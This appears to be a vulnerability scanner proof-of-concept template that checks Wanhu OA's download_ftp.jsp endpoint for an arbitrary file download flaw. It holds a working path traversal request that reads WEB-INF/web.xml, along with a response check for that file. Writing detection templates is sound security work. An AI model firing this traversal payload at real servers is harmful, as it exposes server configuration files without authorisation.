name: poc-yaml-wanghu-oa-downloadftp-file-download
binding: d9994730-4812-43ba-95d1-dde9216bddef
manual: true
detail:
    author: EASY(https://github.com/EASY233)
    links:
        - http://wiki.peiqi.tech/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20download_ftp.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html
    vulnerability:
        id: CT-517559
        level: medium
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"/WEB-INF/tag-lib/") && response.body.bstartsWith(b"<?xml")
expression: r0()
